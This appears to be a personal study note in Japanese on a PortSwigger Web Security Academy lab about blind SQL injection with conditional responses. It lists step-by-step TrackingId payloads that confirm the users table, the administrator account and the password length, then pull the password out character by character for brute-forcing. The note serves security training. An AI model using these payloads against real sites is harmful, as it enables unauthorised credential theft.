
Date: 2025-09-10
Tags: 
Links : [[WSA]], [[SQL]]
***

例：ポップアップで”Welcome back"が表示される時など
　**直接的にクエリの結果は帰ってこないが真偽が判定できる。**
```sql
　xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```
　などで検証していく。
　
>SUBSTRINGはSUBSTRのときもある。

***

## Lab: Blind SQL injection with conditional responses

1. TrackingIdによってWelcome Backが表示されることを知る。
2. 
```sql
…xyz' AND '1'='1
```

でまだ表示される。空白を＋などにしなくていいこと確認。

3. 
```sql
 TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a'--
```

usersテーブルが存在することを確認。

>SELECT 'a' FROM users LIMIT 1 の意味
 >users テーブルから 1行だけ参照する
>その行に対して「固定文字列 'a' を返す」
 >結果として → サブクエリは常に 'a' を返す
 >つまり「テーブルに1行でも存在すれば 'a' を返す」

4. 
```sql
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```
　　
　　administratorがいることを確認。

5. 
```sql
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```

　　長さを確認。

 6. 
```sql
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```

　intruderで総当たりしていく。

***
# References

https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-by-triggering-conditional-responses/sql-injection/blind/lab-conditional-responses